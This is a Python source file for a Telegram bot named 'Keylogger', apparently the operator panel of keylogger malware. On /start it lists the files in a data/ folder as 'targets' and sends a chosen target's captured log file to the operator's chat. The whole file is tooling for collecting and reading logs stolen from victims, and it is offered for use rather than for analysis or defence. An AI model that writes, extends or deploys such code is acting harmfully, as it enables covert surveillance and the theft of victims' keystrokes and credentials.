import os

from pyrogram import Client, filters
from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup

app = Client(
    name="Keylogger",
    api_hash='',
    api_id='',
    bot_token=''
)




@app.on_message(filters=filters.regex("/start"))
async def start(client , message):
    await app.send_message(chat_id= message.chat.id , text="Welcome To Panel Bot" ,  reply_markup=InlineKeyboardMarkup(
            [
                [
                    InlineKeyboardButton("Target Lists" , "target_list"),
                ],
            ]
        )
    )

@app.on_callback_query(filters=filters.regex("target_list"))
async def target_list(client , query):
    btn = [InlineKeyboardButton(text=i , callback_data=i) for i in [name.replace(".txt" , "") for name in os.listdir("data/")]]
    main = [btn[i:i+3] for i in range(0, len(btn), 3)]
    await query.edit_message_text("Target Lists" , reply_markup=InlineKeyboardMarkup(main))

@app.on_callback_query()
async def select_target(client , query):
    await app.send_document(chat_id=query.message.chat.id , document=f"data/{query.data}.txt" , caption=f"Logs Target : {query.data}")

if __name__ == "__main__":
    app.run()
